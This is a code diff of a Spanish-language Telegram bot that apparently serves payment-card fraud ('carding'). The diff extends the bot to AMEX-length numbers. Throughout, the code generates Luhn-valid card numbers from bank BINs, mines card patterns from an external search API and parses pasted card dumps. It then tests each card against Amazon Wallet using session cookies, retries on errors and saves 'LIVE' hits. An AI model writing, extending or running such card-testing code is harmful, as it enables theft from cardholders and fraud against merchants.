@@ -57,9 +57,6 @@ const bankBins = {
     banorte: ['418914', '493173', '493158', '491566']
 };
 
-
-
-
 // ========== FUNCIONES AUXILIARES ==========
 
 async function generarCookieUnica(telegramId) {
@@ -88,6 +85,7 @@ async function generarCookieUnica(telegramId) {
         throw error;
     }
 }
+
 // ========== PROCESAR UN EXTRA CON N COOKIES ==========
 async function procesarExtraConNCookies(chatId, telegramId, extra, numCookies, cantidadTarjetas = 100) {
     // 1. Generar cookies
@@ -257,8 +255,6 @@ function buildProgressMessage(resultados, total, tarjetaActual = null) {
     return text;
 }
 
-
-
 function getBinForBank(bankName) {
     const name = bankName.toLowerCase().trim();
     for (const [key, bins] of Object.entries(bankBins)) {
@@ -271,11 +267,8 @@ function getBinForBank(bankName) {
 
 function escapeMarkdown(text) {
     if (!text) return '';
-    // Escapa caracteres especiales de Markdown v2
     return text.replace(/([_*[\]()~`>#+\-=|{}.!])/g, '\\$1');
 }
-
-
 
 // Obtener el valor global de force_playwright
 async function getGlobalForcePlaywright() {
@@ -291,7 +284,6 @@ async function setGlobalForcePlaywright(value) {
     await pool.query(`UPDATE global_settings SET value = $1 WHERE key = 'force_playwright'`, [value ? 'true' : 'false']);
 }
 
-// Alias para compatibilidad
 async function getUserRoleByTelegramId(telegramId) {
     return await getUserRoleFromDB(telegramId);
 }
@@ -308,8 +300,6 @@ async function sendSafeMessage(chatId, text, options = {}) {
     }
 }
 
-// bot_telegram.js - agregar esta función
-// Reemplaza sendLiveToTelegram por:
 async function sendLiveToTelegram(chatId, message) {
     try {
         await bot.sendMessage(chatId, message, { parse_mode: 'HTML' });
@@ -321,7 +311,6 @@ async function sendLiveToTelegram(chatId, message) {
 }
 
 async function notifyAdminsAndGroups(message, parseMode = 'Markdown') {
-    // Notificar a administradores
     const adminsRes = await pool.query('SELECT telegram_id FROM users WHERE role = $1 AND telegram_id IS NOT NULL', ['admin']);
     for (const admin of adminsRes.rows) {
         if (admin.telegram_id) {
@@ -330,33 +319,45 @@ async function notifyAdminsAndGroups(message, parseMode = 'Markdown') {
             } catch (err) { console.error('Error notificando admin:', err.message); }
         }
     }
-
 }
 
-
+// ========== NUEVA FUNCIÓN: Extraer patrones desde un array de tarjetas (soporta 15 y 16 dígitos) ==========
+function extractPatternsFromCards(cards) {
+    const patrones = {};
+    for (const tarjeta of cards) {
+        const partes = tarjeta.split('|');
+        if (partes.length < 3) continue;
+        const numero = partes[0];
+        // Solo aceptamos 15 o 16 dígitos
+        if (numero.length !== 15 && numero.length !== 16) continue;
+        // Para 15 dígitos (AMEX) tomamos primeros 11, para 16 tomamos 12
+        const prefixLength = numero.length === 15 ? 11 : 12;
+        const prefix = numero.slice(0, prefixLength);
+        const mes = partes[1];
+        const año = partes[2];
+        const clave = `${prefix}xxxx|${mes}|${año}`;
+        patrones[clave] = (patrones[clave] || 0) + 1;
+    }
+    return patrones;
+}
 
 function limpiarTarjetas(textoSucio) {
     if (!textoSucio) return [];
-    // Limpiar caracteres no imprimibles y normalizar separadores
     let texto = textoSucio.replace(/\s+/g, ' ').trim();
-    // Reemplazar separadores comunes por '|'
     texto = texto.replace(/[│,;\t]+/g, '|');
-    
     const tarjetas = [];
-    // Buscar en todo el texto con regex global
-    const regex = /(\d{16})\s*[|]\s*(\d{2})\s*[|]\s*(\d{4})\s*[|]\s*(\d{3,4})/g;
+    // Buscar 15 o 16 dígitos
+    const regex = /(\d{15,16})\s*[|]\s*(\d{2})\s*[|]\s*(\d{4})\s*[|]\s*(\d{3,4})/g;
     let match;
     while ((match = regex.exec(texto)) !== null) {
         tarjetas.push(`${match[1]}|${match[2]}|${match[3]}|${match[4]}`);
     }
-    // Si no se encontró con '|', buscar con espacios
     if (tarjetas.length === 0) {
-        const regex2 = /(\d{16})\s+(\d{2})\s+(\d{4})\s+(\d{3,4})/g;
+        const regex2 = /(\d{15,16})\s+(\d{2})\s+(\d{4})\s+(\d{3,4})/g;
         while ((match = regex2.exec(texto)) !== null) {
             tarjetas.push(`${match[1]}|${match[2]}|${match[3]}|${match[4]}`);
         }
     }
-    // Eliminar duplicados
     const unicos = [...new Set(tarjetas)];
     if (unicos.length === 0) {
         console.log(`⚠️ limpiarTarjetas no encontró tarjetas en: "${textoSucio}"`);
@@ -398,6 +399,7 @@ function calcularDigitoLuhn(numeroParcial) {
     return (10 - (suma % 10)) % 10;
 }
 
+// ========== GENERACIÓN DE TARJETAS (SOPORTA 15 Y 16 DÍGITOS) ==========
 function generarTarjetasDesdePatron(patron, cantidad = 10) {
     let normalizado = patron.trim().replace(/[ /-]+/g, '|');
     if (!normalizado.includes('|') && /[0-9X]{6,16}\d{4,6}/.test(normalizado)) {
@@ -417,16 +419,25 @@ function generarTarjetasDesdePatron(patron, cantidad = 10) {
     if (año.length === 2) año = '20' + año;
     if (año.length !== 4 || isNaN(parseInt(año))) throw new Error('Año inválido (YYYY o YY)');
     numBase = numBase.toUpperCase();
-    if (numBase.length > 16) numBase = numBase.substring(0, 16);
-    if (numBase.length < 16) numBase = numBase + 'X'.repeat(16 - numBase.length);
+    // Determinar longitud: si comienza con 3 o tiene 15 dígitos (incluyendo X) => AMEX 15, else 16
+    let cardLength = 16;
+    const totalLength = numBase.length; // incluye X
+    if (numBase.startsWith('3') || totalLength === 15) {
+        cardLength = 15;
+    }
+    if (numBase.length < cardLength) {
+        numBase = numBase + 'X'.repeat(cardLength - numBase.length);
+    } else if (numBase.length > cardLength) {
+        numBase = numBase.substring(0, cardLength);
+    }
     if (!/^[0-9X]+$/.test(numBase)) throw new Error('Solo dígitos y X');
     const tarjetas = [];
     for (let i = 0; i < cantidad; i++) {
         let numeroConX = '';
         for (let char of numBase) numeroConX += char === 'X' ? Math.floor(Math.random() * 10).toString() : char;
-        const primeros15 = numeroConX.slice(0, 15);
-        const digitoControl = calcularDigitoLuhn(primeros15);
-        const numeroCompleto = primeros15 + digitoControl;
+        const primeros = numeroConX.slice(0, cardLength - 1);
+        const digitoControl = calcularDigitoLuhn(primeros);
+        const numeroCompleto = primeros + digitoControl;
         let cvvGen = (cvv && cvv.toLowerCase() !== 'rnd') ? cvv.slice(0, 3) : Math.floor(100 + Math.random() * 900).toString();
         if (!/^\d{3}$/.test(cvvGen)) cvvGen = Math.floor(100 + Math.random() * 900).toString();
         tarjetas.push(`${numeroCompleto}|${mes}|${año}|${cvvGen}`);
@@ -434,6 +445,7 @@ function generarTarjetasDesdePatron(patron, cantidad = 10) {
     return tarjetas;
 }
 
+// ========== OBTENER PATRONES DESDE BIN (USANDO extractPatternsFromCards) ==========
 async function getPatternsFromBin(chatId, bin) {
     const controller = new AbortController();
     const timeoutId = setTimeout(() => controller.abort(), 600000);
@@ -444,18 +456,7 @@ async function getPatternsFromBin(chatId, bin) {
     if (!response.ok) throw new Error(`HTTP ${response.status}`);
     const data = await response.json();
     if (!data.success || !data.data || data.data.length === 0) throw new Error('No se encontraron tarjetas para ese BIN');
-    const patrones = {};
-    for (const tarjeta of data.data) {
-        const partes = tarjeta.split('|');
-        if (partes.length < 3) continue;
-        const numero = partes[0];
-        if (numero.length !== 16) continue;
-        const prefix = numero.slice(0, 12);
-        const mes = partes[1];
-        const año = partes[2];
-        const clave = `${prefix}xxxx|${mes}|${año}`;
-        patrones[clave] = (patrones[clave] || 0) + 1;
-    }
+    const patrones = extractPatternsFromCards(data.data);
     if (Object.keys(patrones).length === 0) throw new Error('No se extrajeron patrones');
     const ordenados = Object.entries(patrones).map(([p, c]) => ({ patron: p, count: c })).sort((a, b) => b.count - a.count);
     return ordenados.map(p => {
@@ -522,7 +523,6 @@ async function checkAndKickIfNoDaysOrCredits(telegramId, chatId, requiredCredits
     const { credits, days_remaining } = user.rows[0];
     if (days_remaining <= 0) {
         if (GROUP_CHAT_ID) await kickUserFromGroup(telegramId);
-
         await sendSafeMessage(chatId, '❌ Tus días han expirado.');
         return false;
     }
@@ -555,7 +555,6 @@ async function checkAndUpdateTelegramProfile(telegramId, userId, currentUsername
     return changes;
 }
 
-// ========== FUNCIONES AUXILIARES FALTANTES ==========
 function getCommandParam(msg, commandName) {
     const text = msg.text;
     const regex = new RegExp(`^[\\/\\.]${commandName}(?:\\s+(.+))?`, 'i');
@@ -564,7 +563,7 @@ function getCommandParam(msg, commandName) {
     return null;
 }
 
-// ========== FUNCIÓN BASE: VERIFICAR UNA TARJETA CON UNA COOKIE ==========
+// ========== VERIFICACIÓN DE TARJETA CON COOKIE ==========
 async function verificarTarjetaConCookie(card, cookie) {
     try {
         const controller = new AbortController();
@@ -577,7 +576,6 @@ async function verificarTarjetaConCookie(card, cookie) {
         });
         clearTimeout(timeoutId);
         const data = await resp.json();
-        // Combinar todos los mensajes para buscar keywords
         const allText = ((data.message || '') + ' ' + (data.original_message || '') + ' ' + (data.original_status || '')).toLowerCase();
         const isBanned = allText.includes('cookie expirada') ||
                          allText.includes('inicia sesión') ||
@@ -587,7 +585,7 @@ async function verificarTarjetaConCookie(card, cookie) {
                          allText.includes('seguridad') ||
                          allText.includes('suspicious') ||
                          allText.includes('locked') ||
-                         allText.includes('wallet') ||        // para capturar "Error al entrar a AmazonWallet"
+                         allText.includes('wallet') ||
                          allText.includes('amazonwallet');
         return { status: data.status, isBanned, message: data.message };
     } catch (err) {
@@ -595,39 +593,29 @@ async function verificarTarjetaConCookie(card, cookie) {
     }
 }
 
-
-// Verifica una tarjeta con reintentos si el error es de Wallet
 async function verificarTarjetaConReintentos(card, cookie, maxReintentos = 2) {
-        let intentos = 0;
-        while (intentos <= maxReintentos) {
-            const resultado = await verificarTarjetaConCookie(card, cookie);
-            const msgLower = (resultado.message || '').toLowerCase();
-            const esErrorWallet = msgLower.includes('no se pudo acceder a wallet') ||
-                                msgLower.includes('error al entrar a amazonwallet') ||
-                                msgLower.includes('fallo al obtener wallet') ||
-                                msgLower.includes('no se pudo agregar tarjeta');
-            
-            // Si es LIVE o DEAD, devolver inmediatamente
-            if (resultado.status === 'LIVE' || resultado.status === 'DEAD') {
-                return { ...resultado, intentos };
-            }
-            
-            // Si es error de wallet y no es el último intento, reintentar
-            if (esErrorWallet && intentos < maxReintentos) {
-                console.log(`🔄 Reintentando tarjeta (${intentos+1}/${maxReintentos}) por error de Wallet`);
-                await new Promise(r => setTimeout(r, 2000)); // espera 2s antes de reintentar
-                intentos++;
-                continue;
-            }
-            
-            // Si es otro error (incluyendo cookie expirada), devolver sin reintentar
+    let intentos = 0;
+    while (intentos <= maxReintentos) {
+        const resultado = await verificarTarjetaConCookie(card, cookie);
+        const msgLower = (resultado.message || '').toLowerCase();
+        const esErrorWallet = msgLower.includes('no se pudo acceder a wallet') ||
+                            msgLower.includes('error al entrar a amazonwallet') ||
+                            msgLower.includes('fallo al obtener wallet') ||
+                            msgLower.includes('no se pudo agregar tarjeta');
+        if (resultado.status === 'LIVE' || resultado.status === 'DEAD') {
             return { ...resultado, intentos };
         }
-        // Si se acabaron los reintentos
-        return { status: 'ERROR', message: 'Error de Wallet tras reintentos', isBanned: false, intentos };
+        if (esErrorWallet && intentos < maxReintentos) {
+            console.log(`🔄 Reintentando tarjeta (${intentos+1}/${maxReintentos}) por error de Wallet`);
+            await new Promise(r => setTimeout(r, 2000));
+            intentos++;
+            continue;
+        }
+        return { ...resultado, intentos };
+    }
+    return { status: 'ERROR', message: 'Error de Wallet tras reintentos', isBanned: false, intentos };
 }
 
-// ========== VERIFICACIÓN CON PROGRESO UNIFICADO ==========
 // ========== VERIFICACIÓN CON PROGRESO UNIFICADO (CON REINTENTOS Y CANCELACIÓN) ==========
 async function verificarTarjetasConProgreso(chatId, telegramId, cookie, tarjetas) {
     const total = tarjetas.length;
@@ -642,7 +630,6 @@ async function verificarTarjetasConProgreso(chatId, telegramId, cookie, tarjetas
         if (userRes.rows.length > 0) username = userRes.rows[0].username;
     }
 
-    // Función para construir el texto del mensaje de progreso (con o sin tarjeta actual)
     function buildProgressMessage(tarjetaActual = null, cancelado = false) {
         const separador = SEPARATORS[0];
         let text = `📊 *Resultados de chequeo*\n🔍 Progreso: ${resultados.length}/${total}\n`;
@@ -652,7 +639,6 @@ async function verificarTarjetasConProgreso(chatId, telegramId, cookie, tarjetas
             text += `• Status: ${r.status}\n`;
         }
         if (cancelado) {
-            // Si se canceló por cookie expirada, mostrar resumen final y no mostrar tarjeta actual
             text += `${separador}\n`;
             text += `⛔️ *Chequeo finalizado por cookie expirada*\n`;
             text += `💚 Lives: ${stats.lives}\n`;
@@ -668,38 +654,28 @@ async function verificarTarjetasConProgreso(chatId, telegramId, cookie, tarjetas
         return text;
     }
 
-    // Enviar mensaje inicial con la primera tarjeta
     const initialText = buildProgressMessage(tarjetas[0]);
     progressMsg = await sendSafeMessage(chatId, initialText, { parse_mode: 'Markdown' });
     if (!progressMsg) return;
 
-    // Recorrer cada tarjeta
     for (let i = 0; i < total; i++) {
         const card = tarjetas[i];
-
-        // Verificar con cookie actual
         let resultado = await verificarTarjetaConReintentos(card, cookie, 2);
 
-        // Si la cookie expiró o cuenta baneada, cancelar proceso
         if (resultado.isBanned) {
-            // Agregar la tarjeta actual como error por cookie expirada
             resultados.push({
                 card: card,
                 status: '⛔️ Error (cookie expirada)'
             });
-            // Mostrar mensaje de cancelación con resumen
             const finalText = buildProgressMessage(null, true);
             try {
                 await bot.editMessageText(finalText, { chat_id: chatId, message_id: progressMsg.message_id, parse_mode: 'Markdown' });
             } catch (e) {}
-            // No enviamos mensaje extra, todo queda en el mismo mensaje
             procesoCancelado = true;
             break;
         }
 
-        // Si es un error (no LIVE/DEAD) y no es baneo, reintentar una vez
         if (resultado.status !== 'LIVE' && resultado.status !== 'DEAD') {
-            // Mostrar "ERROR - Reintentando chequeo"
             resultados.push({
                 card: card,
                 status: 'ERROR - Reintentando chequeo ⚠️'
@@ -709,11 +685,9 @@ async function verificarTarjetasConProgreso(chatId, telegramId, cookie, tarjetas
                 await bot.editMessageText(textoReintento, { chat_id: chatId, message_id: progressMsg.message_id, parse_mode: 'Markdown' });
             } catch (e) {}
 
-            // Reintentar una vez con la misma cookie
             const reintento = await verificarTarjetaConReintentos(card, cookie, 2);
             if (reintento.isBanned) {
-                // Si el reintento da cookie expirada, cancelar
-                resultados.pop(); // quitar el "Reintentando"
+                resultados.pop();
                 resultados.push({
                     card: card,
                     status: '⛔️ Error (cookie expirada)'
@@ -725,21 +699,17 @@ async function verificarTarjetasConProgreso(chatId, telegramId, cookie, tarjetas
                 procesoCancelado = true;
                 break;
             }
-            // Si el reintento da LIVE o DEAD, usamos ese resultado
             if (reintento.status === 'LIVE' || reintento.status === 'DEAD') {
                 resultado = reintento;
             } else {
-                // Si sigue en error, mantener el error
                 resultado = reintento;
             }
         }
 
-        // Actualizar estadísticas
         if (resultado.status === 'LIVE') stats.lives++;
         else if (resultado.status === 'DEAD') stats.deads++;
         else stats.errors++;
 
-        // Guardar live si es LIVE
         if (resultado.status === 'LIVE' && username) {
             try {
                 await fetch(`${INTERNAL_API_URL}/telegram/save-live`, {
@@ -756,7 +726,6 @@ async function verificarTarjetasConProgreso(chatId, telegramId, cookie, tarjetas
             }
         }
 
-        // Determinar estado a mostrar
         let statusDisplay = '';
         if (resultado.status === 'LIVE') statusDisplay = 'LIVE ✅';
         else if (resultado.status === 'DEAD') statusDisplay = 'DEAD ❌';
@@ -772,7 +741,6 @@ async function verificarTarjetasConProgreso(chatId, telegramId, cookie, tarjetas
             statusDisplay = `ERROR ⚠️`;
         }
 
-        // Actualizar el resultado final (reemplazar el "Reintentando" si existía)
         const existingIndex = resultados.findIndex(r => r.card === card);
         if (existingIndex !== -1) {
             resultados[existingIndex].status = statusDisplay;
@@ -780,7 +748,6 @@ async function verificarTarjetasConProgreso(chatId, telegramId, cookie, tarjetas
             resultados.push({ card, status: statusDisplay });
         }
 
-        // Actualizar mensaje de progreso con la siguiente tarjeta (si existe)
         const nextCard = (i + 1 < total && !procesoCancelado) ? tarjetas[i + 1] : null;
         const nuevoTexto = buildProgressMessage(nextCard);
         try {
@@ -789,10 +756,7 @@ async function verificarTarjetasConProgreso(chatId, telegramId, cookie, tarjetas
         await new Promise(r => setTimeout(r, 800));
     }
 
-    // Si no se canceló, mostrar un mensaje final (opcional, pero el progreso ya está completo)
     if (!procesoCancelado) {
-        // No es necesario enviar otro mensaje, el progreso ya muestra todo
-        // Pero podemos actualizar el mensaje para que no quede "Verificando" si terminó
         const finalText = buildProgressMessage(null);
         try {
             await bot.editMessageText(finalText, { chat_id: chatId, message_id: progressMsg.message_id, parse_mode: 'Markdown' });
@@ -800,14 +764,10 @@ async function verificarTarjetasConProgreso(chatId, telegramId, cookie, tarjetas
     }
 }
 
-
-// Mantén esta función pero que delegue en la nueva
 async function verificarTarjetasConCookie(chatId, telegramId, cookie, tarjetas, mensajePrevio) {
-    // Usar el nuevo sistema de progreso
     await verificarTarjetasConProgreso(chatId, telegramId, cookie, tarjetas);
 }
 
-// Función para obtener información de BIN desde binlist.net
 async function getBinInfo(bin) {
     try {
         const controller = new AbortController();
@@ -831,7 +791,7 @@ async function getBinInfo(bin) {
     }
 }
 
-// Preparar extrapolación (sin cookie)
+// ========== PREPARAR EXTRAPOLACIÓN (USANDO extractPatternsFromCards) ==========
 async function prepararExtrapolacion(chatId, telegramId, param) {
     const esBin = /^\d{6}$/.test(param);
     let normalizedParam = normalizarExtra(param);
@@ -853,19 +813,9 @@ async function prepararExtrapolacion(chatId, telegramId, param) {
             } catch (err) { attempts++; if (attempts >= 3) throw err; await new Promise(r => setTimeout(r, 2000)); }
         }
         if (!data.success || !data.data.length) throw new Error('Sin resultados');
-        const patrones = {};
-        for (const tarjeta of data.data) {
-            const partes = tarjeta.split('|');
-            if (partes.length < 3) continue;
-            const numero = partes[0];
-            if (numero.length !== 16) continue;
-            const prefix = numero.slice(0, 12);
-            const mes = partes[1];
-            const año = partes[2];
-            const clave = `${prefix}xxxx|${mes}|${año}`;
-            patrones[clave] = (patrones[clave] || 0) + 1;
-        }
-        const ordenados = Object.entries(patrones).map(([p,c]) => ({ patron: p, count: c })).sort((a,b) => b.count - a.count);
+        const patrones = extractPatternsFromCards(data.data);
+        if (Object.keys(patrones).length === 0) throw new Error('No se extrajeron patrones');
+        const ordenados = Object.entries(patrones).map(([p, c]) => ({ patron: p, count: c })).sort((a, b) => b.count - a.count);
         const mejor = ordenados[0];
         const [prefijoConX, mes, año] = mejor.patron.split('|');
         const extraElegido = `${prefijoConX}|${mes}|${año}|rnd`;
@@ -911,7 +861,6 @@ async function prepararExtrapolacion(chatId, telegramId, param) {
     return { tarjetas, mensajePrevio };
 }
 
-// Handlers para comandos simples
 async function handleBinlistCommand(chatId, telegramId, query) {
     if (!await checkAndKickIfNoDaysOrCredits(telegramId, chatId, 0)) return;
     await sendSafeMessage(chatId, `🔍 Buscando bins para: ${query}...`);
@@ -925,15 +874,13 @@ async function handleBinlistCommand(chatId, telegramId, query) {
     await sendSafeMessage(chatId, `📋 *Bins encontrados para ${query}:*\n\n💳 Lista de bins:\n${binsUnicos.join(', ')}`, { parse_mode: 'Markdown' });
 }
 
-// ========== COMANDO MULTIEXTRA (handler separado) ==========
+// ========== COMANDO MULTIEXTRA ==========
 async function handleMultiExtraCommand(chatId, telegramId, input) {
-    // Si no hay input, pedir interactivo
     if (!input) {
         setUserState(telegramId, { step: 'awaiting_multiextra_input' });
         return sendSafeMessage(chatId, '📌 Envía un BIN, nombre de banco, o una lista de extras (uno por línea)');
     }
 
-    // Procesar input
     let extras = [];
     let esBin = /^\d{6}$/.test(input);
     let esBanco = !esBin && getBinForBank?.(input) !== null;
@@ -951,7 +898,6 @@ async function handleMultiExtraCommand(chatId, telegramId, input) {
             return sendSafeMessage(chatId, `❌ Error al extrapolar: ${err.message}`);
         }
     } else {
-        // Parsear lista de extras (líneas con |)
         const lineas = input.split(/\r?\n/);
         for (const linea of lineas) {
             const trimmed = linea.trim();
@@ -970,7 +916,6 @@ async function handleMultiExtraCommand(chatId, telegramId, input) {
         await sendSafeMessage(chatId, `📋 *Extras encontrados (${extras.length}):*\n${listaMostrada}`, { parse_mode: 'Markdown' });
     }
 
-    // Guardar extras en estado y preguntar cuántos usar
     setUserState(telegramId, { step: 'awaiting_multiextra_extra_count', data: { extras } });
     await sendSafeMessage(chatId, `🔢 ¿Cuántos extras deseas usar? (1-${extras.length})`);
 }
@@ -997,16 +942,7 @@ async function handleExtrapoladorCommand(chatId, telegramId, input) {
         if (!response.ok) throw new Error(`HTTP ${response.status}`);
         const data = await response.json();
         if (!data.success || !data.data || data.data.length === 0) throw new Error('Sin resultados');
-        const patrones = {};
-        for (const tarjeta of data.data) {
-            const partes = tarjeta.split('|');
-            if (partes.length < 3) continue;
-            const numero = partes[0];
-            if (numero.length !== 16) continue;
-            const prefix = numero.slice(0, 12);
-            const clave = `${prefix}xxxx|${partes[1]}|${partes[2]}`;
-            patrones[clave] = (patrones[clave] || 0) + 1;
-        }
+        const patrones = extractPatternsFromCards(data.data);
         if (Object.keys(patrones).length === 0) throw new Error('No se extrajeron patrones');
         const muy = [], mod = [], uni = [];
         for (const [patron, count] of Object.entries(patrones)) {
@@ -1022,8 +958,7 @@ async function handleExtrapoladorCommand(chatId, telegramId, input) {
             mensaje += `🟢 MUY REPETIDOS (${muy.length}):\n`;
             for (const p of muy.slice(0,15)) {
                 const [prefixWithX, mes, año] = p.patron.split('|');
-                const prefix = prefixWithX.slice(0, 12);
-                mensaje += `\`${prefix}xxxx|${mes}|${año}|rnd\` (${p.count} veces)\n`;
+                mensaje += `\`${prefixWithX}|${mes}|${año}|rnd\` (${p.count} veces)\n`;
             }
             mensaje += `\n`;
         }
@@ -1031,7 +966,7 @@ async function handleExtrapoladorCommand(chatId, telegramId, input) {
             mensaje += `🟡 MODERADOS (${mod.length}):\n`;
             for (const p of mod.slice(0,15)) {
                 const [prefix, mes, año] = p.patron.split('|');
-                mensaje += `\`${prefix}xxxx|${mes}|${año}|rnd\` (${p.count} veces)\n`;
+                mensaje += `\`${prefix}|${mes}|${año}|rnd\` (${p.count} veces)\n`;
             }
             mensaje += `\n`;
         }
@@ -1039,7 +974,7 @@ async function handleExtrapoladorCommand(chatId, telegramId, input) {
             mensaje += `🔴 ÚNICOS (${uni.length}):\n`;
             for (const p of uni.slice(0,20)) {
                 const [prefix, mes, año] = p.patron.split('|');
-                mensaje += `\`${prefix}xxxx|${mes}|${año}|rnd\` (${p.count} vez)\n`;
+                mensaje += `\`${prefix}|${mes}|${año}|rnd\` (${p.count} vez)\n`;
             }
         }
         if (mensaje.length > 4090) mensaje = mensaje.substring(0,4000) + "\n...";
@@ -1054,23 +989,19 @@ async function handleGenCommand(chatId, telegramId, fullParam, replyText = null)
     let cantidad = 14;
     let input = fullParam;
 
-    // Si el parámetro es solo un número, usarlo como cantidad y tomar el patrón del reply
     if (/^\d+$/.test(input) && replyText) {
         cantidad = parseInt(input);
         if (cantidad > 50) cantidad = 50;
         input = replyText.trim();
     } else if (!input && replyText) {
-        // Si no hay parámetro pero hay reply, usar el reply
         input = replyText.trim();
     }
 
-    // Si input está vacío, pedir interactivo
     if (!input) {
         setUserState(telegramId, { step: 'awaiting_gen_param' });
         return sendSafeMessage(chatId, '🎴 Envía un extra, BIN o nombre de banco (o responde a un mensaje con el patrón):');
     }
 
-    // Extraer cantidad opcional del input si no se especificó antes
     const cantMatch = input.match(/\s+(\d+)$/);
     if (cantMatch && !/^\d+$/.test(fullParam)) {
         cantidad = parseInt(cantMatch[1]);
@@ -1078,7 +1009,6 @@ async function handleGenCommand(chatId, telegramId, fullParam, replyText = null)
         input = input.substring(0, cantMatch.index).trim();
     }
 
-    // Si input tiene saltos de línea, combinarlos (por si pegaron varias líneas)
     if (input.includes('\n')) {
         input = input.replace(/\n/g, '|').replace(/\s+/g, '');
     }
@@ -1112,27 +1042,18 @@ async function handleGenCommand(chatId, telegramId, fullParam, replyText = null)
             const response = await fetch(`${API_EXTRAPOLADOR_URL}/api/search-bin`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ bin: input }) });
             const data = await response.json();
             if (!data.success || !data.data || !data.data.length) throw new Error('No se encontraron tarjetas');
-            const patrones = {};
-            for (const tarjeta of data.data) {
-                const partes3 = tarjeta.split('|');
-                if (partes3.length < 3) continue;
-                const num = partes3[0];
-                if (num.length !== 16) continue;
-                const pref = num.slice(0,12);
-                const clave = `${pref}xxxx|${partes3[1]}|${partes3[2]}`;
-                patrones[clave] = (patrones[clave] || 0) + 1;
-            }
+            const patrones = extractPatternsFromCards(data.data);
             const items = Object.entries(patrones).map(([p,c]) => ({ patron: p, count: c }));
             const muy = items.filter(i => i.count >= 3).sort((a,b)=>b.count-a.count);
             const mod = items.filter(i => i.count === 2).sort((a,b)=>b.count-a.count);
             const uni = items.filter(i => i.count === 1).sort((a,b)=>b.count-a.count);
             const mejor = muy[0] || mod[0] || uni[0];
             const [prefijo, mes, año] = mejor.patron.split('|');
-            const extraElegido = `${prefijo}xxxx|${mes}|${año}|rnd`;
-            let mensaje = `=== EXTRAPOLACIÓN COMPLETADA ===\n✅ EXTRA A GENERAR: \`${prefijo}xxxx | ${mes}/${año}\` | (${mejor.count} veces)\n\n`;
-            if (muy.length) mensaje += `🟢 MUY REPETIDOS (${muy.length}):\n${muy.slice(0,10).map(p => { const [pf,m,a] = p.patron.split('|'); return `${pf}xxxx | ${m}/${a} | (${p.count} veces)`; }).join('\n')}\n\n`;
-            if (mod.length) mensaje += `🟡 MODERADOS (${mod.length}):\n${mod.slice(0,5).map(p => { const [pf,m,a] = p.patron.split('|'); return `${pf}xxxx | ${m}/${a} | (${p.count} veces)`; }).join('\n')}\n\n`;
-            if (uni.length) mensaje += `🔴 ÚNICOS (${uni.length}):\n${uni.slice(0,10).map(p => { const [pf,m,a] = p.patron.split('|'); return `${pf}xxxx | ${m}/${a} | (${p.count} vez)`; }).join('\n')}`;
+            const extraElegido = `${prefijo}|${mes}|${año}|rnd`;
+            let mensaje = `=== EXTRAPOLACIÓN COMPLETADA ===\n✅ EXTRA A GENERAR: \`${prefijo}|${mes}/${año}|rnd\` | (${mejor.count} veces)\n\n`;
+            if (muy.length) mensaje += `🟢 MUY REPETIDOS (${muy.length}):\n${muy.slice(0,10).map(p => { const [pf,m,a] = p.patron.split('|'); return `${pf}|${m}/${a}|rnd (${p.count} veces)`; }).join('\n')}\n\n`;
+            if (mod.length) mensaje += `🟡 MODERADOS (${mod.length}):\n${mod.slice(0,5).map(p => { const [pf,m,a] = p.patron.split('|'); return `${pf}|${m}/${a}|rnd (${p.count} veces)`; }).join('\n')}\n\n`;
+            if (uni.length) mensaje += `🔴 ÚNICOS (${uni.length}):\n${uni.slice(0,10).map(p => { const [pf,m,a] = p.patron.split('|'); return `${pf}|${m}/${a}|rnd (${p.count} vez)`; }).join('\n')}`;
             await sendSafeMessage(chatId, mensaje, { parse_mode: 'Markdown' });
             const tarjetas = generarTarjetasDesdePatron(extraElegido, cantidad);
             const lista = tarjetas.slice(0,20).map(t => `\`${t}\``).join('\n');
@@ -1152,6 +1073,7 @@ async function handleGenCommand(chatId, telegramId, fullParam, replyText = null)
         }
     } catch (error) { await sendSafeMessage(chatId, `❌ Error: ${error.message}`); }
 }
+
 async function handleLimpiadorCommand(chatId, telegramId, texto) {
     const tarjetas = limpiarTarjetas(texto);
     if (tarjetas.length === 0) return sendSafeMessage(chatId, '❌ No se encontraron tarjetas.');
@@ -1159,7 +1081,6 @@ async function handleLimpiadorCommand(chatId, telegramId, texto) {
     await sendSafeMessage(chatId, `🔍 *Tarjetas encontradas (${tarjetas.length}):*\n${lista}`, { parse_mode: 'Markdown' });
 }
 
-// Función handleAmazonCommand (versión simplificada pero funcional)
 async function handleAmazonCommand(chatId, telegramId, param) {
     const user = await pool.query('SELECT id, cookie, credits, days_remaining FROM users WHERE telegram_id = $1', [telegramId]);
     if (!user.rows.length) return sendSafeMessage(chatId, '❌ Usa /start primero.');
@@ -1170,13 +1091,11 @@ async function handleAmazonCommand(chatId, telegramId, param) {
         return;
     }
     let tarjetas = limpiarTarjetas(param);
-    tarjetas = limpiarTarjetas(param); // ✅ Luego asignar
     if (tarjetas.length > 0) {
-        await verificarTarjetasConProgreso(chatId, telegramId, cookie, tarjetas, null);
+        await verificarTarjetasConProgreso(chatId, telegramId, cookie, tarjetas);
         return;
     }
 
-    // Si no hay tarjetas y el parámetro tiene saltos de línea, combinarlos
     let inputParaNormalizar = param;
     if (tarjetas.length === 0 && param.includes('\n')) {
         inputParaNormalizar = param.replace(/\n/g, '|').replace(/\s+/g, '');
@@ -1208,30 +1127,25 @@ async function handleAmazonCommand(chatId, telegramId, param) {
         } else {
             throw new Error('Formato no reconocido.');
         }
-        await verificarTarjetasConProgreso(chatId, telegramId, cookie, tarjetas, null);
+        await verificarTarjetasConProgreso(chatId, telegramId, cookie, tarjetas);
     } catch (error) { await sendSafeMessage(chatId, `❌ Error: ${error.message}`); }
 }
 
-
 async function handleAmazonCookieInfinita(chatId, telegramId, fullParam) {
-    // Limpiar estado anterior
     clearUserState(telegramId);
-    // Activar flag de cancelación
     cancellationFlags.set(telegramId, false);
 
-    // Función para verificar una tarjeta (con reintentos por wallet)
     async function verificarTarjeta(card, cookie) {
         return await verificarTarjetaConReintentos(card, cookie, 2);
     }
 
-    // Obtener tarjetas
     let tarjetas = [];
     let cantidad = null;
     let extra = null;
 
     const lineas = fullParam.split(/\r?\n/);
     for (const linea of lineas) {
-        const matchCard = linea.match(/(\d{16})\s*[|]\s*(\d{2})\s*[|]\s*(\d{4})\s*[|]\s*(\d{3,4})/);
+        const matchCard = linea.match(/(\d{15,16})\s*[|]\s*(\d{2})\s*[|]\s*(\d{4})\s*[|]\s*(\d{3,4})/);
